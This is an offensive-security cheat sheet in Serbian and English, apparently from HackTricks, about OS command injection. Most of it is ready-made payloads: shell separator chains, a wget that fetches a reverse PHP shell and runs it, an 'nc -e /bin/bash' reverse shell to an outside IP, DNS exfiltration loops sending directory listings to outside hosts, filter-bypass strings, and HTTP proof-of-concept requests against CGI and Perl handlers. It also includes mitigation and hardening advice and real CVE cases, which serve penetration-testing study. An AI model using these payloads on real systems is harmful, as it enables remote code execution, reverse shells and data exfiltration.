# Command Injection

{{#include ../banners/hacktricks-training.md}}

## Šta je command Injection?

**command injection** omogućava izvršavanje proizvoljnih operativnih sistemskih komandi od strane napadača na serveru koji hostuje aplikaciju. Kao rezultat, aplikacija i svi njeni podaci mogu biti u potpunosti kompromitovani. Izvršavanje ovih komandi obično omogućava napadaču da stekne neovlašćeni pristup ili kontrolu nad okruženjem aplikacije i osnovnim sistemom.

### Kontekst

U zavisnosti od **gde se vaš unos ubacuje**, možda ćete morati da **zatvorite kontekst u navodnicima** (koristeći `"` ili `'`) pre izvršenja komandi.

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **Ograničenja** Bypasses

Ako pokušavate da izvršite **arbitrary commands inside a linux machine**, biće vam interesantno da pročitate o ovim **Bypasses:**


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **Primeri**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### Parametri

Evo 25 najčešćih parametara koji bi mogli biti ranjivi na code injection i slične RCE ranjivosti (iz [link](https://twitter.com/trbughunters/status/1283133356922884096)):
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Time based data exfiltration

Ekstrakcija podataka: znak po znak
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### DNS based data exfiltration

Na osnovu alata sa `https://github.com/HoLyVieR/dnsbin` koji je takođe hostovan na dnsbin.zhack.ca
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
Online alati za proveru DNS based data exfiltration:

- dnsbin.zhack.ca
- pingb.in

### Filtering bypass

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

Prilikom pregleda JavaScript/TypeScript back-endova često ćete naići na Node.js `child_process` API.
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()` pokreće **shell** (`/bin/sh -c`), zato će svaki karakter koji ima posebno značenje za shell (back-ticks, `;`, `&&`, `|`, `$()`, …) rezultirati **command injection** kada se korisnički unos konkatenira u string.

**Mitigacija:** koristite `execFile()` (ili `spawn()` bez `shell` opcije) i prosledite **svaki argument kao poseban element niza** tako da shell nije uključen:
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
Stvarni slučaj: *Synology Photos* ≤ 1.7.0-0794 was exploitable through an unauthenticated WebSocket event that placed attacker controlled data into `id_user` which was later embedded in an `exec()` call, achieving RCE (Pwn2Own Ireland 2024).

### Injekcija argumenata/opcija pomoću vodeće crtice (argv, no shell metacharacters)

Ne sve injekcije zahtevaju shell metakaraktere. Ako aplikacija prosleđuje nepouzdane stringove kao argumente sistemskom utilitu (čak i sa `execve`/`execFile` i bez shell-a), mnogi programi i dalje će parsirati svaki argument koji počinje sa `-` ili `--` kao opciju. Ovo omogućava napadaču da promeni režime, izlazne putanje ili pokrene opasna ponašanja bez ikakvog ulaska u shell.

Tipična mesta gde se ovo pojavljuje:

- Ugrađeni web UI/CGI handler-i koji grade komande kao što su `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>`, itd.
- Centralizovani CGI router-i (npr. `/cgi-bin/<something>.cgi` sa parametrom selektora kao `topicurl=<handler>`) gde više handler-a koristi isti slabi validator.

Šta probati:

- Unesite vrednosti koje počinju sa `-`/`--` da bi ih ciljni alat tretirao kao opcije.
- Iskoristite opcije koje menjaju ponašanje ili pišu fajlove, na primer:
- `ping`: `-f`/`-c 100000` za opterećenje uređaja (DoS)
- `curl`: `-o /tmp/x` za upis u proizvoljne putanje, `-K <url>` za učitavanje konfiguracije pod kontrolom napadača
- `tcpdump`: `-G 1 -W 1 -z /path/script.sh` da biste postigli izvršavanje nakon rotacije u nesigurnim wrapper-ima
- Ako program podržava `--` end-of-options, pokušajte da zaobiđete naivne mitigacije koje dodaju `--` na pogrešno mesto.

Generički PoC obrasci protiv centralizovanih CGI dispečera:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
## Brute-Force Detection List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}

## Perl backticks/qx// sinks in Apache mod_perl handlers (reachability and exploitation)

Običan obrazac iz stvarnog sveta: Perl kod formira string shell komande i izvršava ga putem backticks (ili qx//). U mod_perl AccessHandler-u, delovi zahteva pod kontrolom napadača kao što je $r->uri() mogu dospeti u taj string. Ako bilo koja grana konkatenira sirovi ulaz i zatim ga izvrši pomoću shella, dobijate pre-auth RCE.

Rizične Perl execution primitives (pokrenu shell kada dobiju jedan string):
- Backticks / qx//: my $out = `cmd ...`;
- system with a single string: system("/bin/sh -c '...'") implicitly
- open with a pipe: open my $fh, "cmd |" or "| cmd"
- IPC::Open3 with a single string

Minimalno ranjiv oblik primećen u stvarnom svetu:
```perl
sub getCASURL {
...
my $exec_cmd = "...";
if ($type eq 'login') {
$exec_cmd .= $uri;        # $uri from $r->uri() → attacker-controlled
my $out = `$exec_cmd`;    # backticks = shell
}
}
```
Ključna razmatranja dostupnosti u mod_perl:
- Handler registration: httpd.conf mora usmeriti zahteve u vaš Perl modul, npr. PerlModule MOD_SEC_EMC::AccessHandler i konfiguracija koja poziva AccessHandler::handler za opseg putanje.
- Triggering the vulnerable branch: prisilite neautentifikovani login flow tako da type == "login" (npr. izostavite očekivani auth cookie).
- Resolvable path: osigurajte da vaš zahtev cilja URI koji se razrešava unutar konfigurisane oblasti. Ako Apache nikada ne prosledi zahtev kroz handler, sink neće biti dostignut.

Exploitation workflow
1) Pregledajte httpd.conf zbog PerlModule/MOD_PERL handler scope-ova kako biste pronašli razrešivu putanju koju obrađuje handler.
2) Pošaljite neautentifikovani zahtev tako da se izabere putanja za redirect na login (type == "login").
3) Postavite shell metacharacters u request-URI putanju tako da $r->uri() prenese vaš payload u komandni niz.

Example HTTP PoC (path injection via ';')
```http
GET /ui/health;id HTTP/1.1
Host: target
Connection: close
```
Saveti
- Isprobajte separatore: ;, &&, |, `backticks`, $(...), i enkodirane nove linije (%0A) u zavisnosti od citiranja.
- Ako ranije zakrpe citiraju druge argumente ali ne i URI u jednoj grani, payloadi dodati na kraj stringa često rade: ;id# or &&/usr/bin/id#

Ojačavanje (Perl)
- Ne gradite shell stringove. Preferirajte izvršavanje putem argument-vektora: system('/usr/bin/curl', '--silent', '--', $safe_url) — bez pozivanja shella.
- Ako je shell neizbežan, escape-ujte striktno i dosledno u svim granama; tretirajte $r->uri() kao zlonameran. Razmotrite URI::Escape za paths/queries i stroge liste dozvoljenih.
- Izbegavajte backticks/qx// za izvršavanje komandi; uhvatite izlaz preko open3/list forme ako je stvarno neophodno, bez pozivanja shella.
- U mod_perl handler-ima, držite auth/redirect code paths bez izvršavanja komandi ili osigurajte identičnu sanitizaciju kroz sve grane da biste izbegli regresije “fixed everywhere but one branch”.

Lov na ranjivosti
- Uporedite patch-diff module koje sastavljaju shell komande; tražite nedosledno citiranje između grana (npr., if ($type eq 'login') ostavljen ne-escape-ovan).
- Grep-ujte za backticks, qx//, open\s*\(|\||, i system\s*\(\s*" da biste pronašli shellove zasnovane na stringovima. Izgradite call graph od sinka do ulaza zahteva ($r) da verifikujete pre-auth dostupnost.

Real-world case: Dell UnityVSA pre-auth RCE (CVE-2025-36604)
- Pre-auth command injection via backticks in AccessTool.pm:getCASURL when type == "login" concatenated raw $uri ($r->uri()).
- Reachable through MOD_SEC_EMC::AccessHandler → make_return_address($r) → getCASLoginURL(..., type="login") → getCASURL(..., $uri, 'login').
- Praktična napomena: koristite putanju koja može da se razreši i koju pokriva handler; u suprotnom modul neće biti izvršen i sink neće biti pogođen.

## References

- [It’s Never Simple Until It Is: Dell UnityVSA Pre‑Auth Command Injection (CVE‑2025‑36604)](https://labs.watchtowr.com/its-never-simple-until-it-is-dell-unityvsa-pre-auth-command-injection-cve-2025-36604/)
- [Dell PSIRT DSA‑2025‑281 – Security update for Dell Unity/UnityVSA/Unity XT](https://www.dell.com/support/kbdoc/en-uk/000350756/dsa-2025-281-security-update-for-dell-unity-dell-unityvsa-and-dell-unity-xt-security-update-for-multiple-vulnerabilities)
- [watchTowr Detection Artefact Generator – Dell UnityVSA Pre‑Auth CVE‑2025‑36604](https://github.com/watchtowrlabs/watchTowr-vs-Dell-UnityVSA-PreAuth-CVE-2025-36604)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)

{{#include ../banners/hacktricks-training.md}}
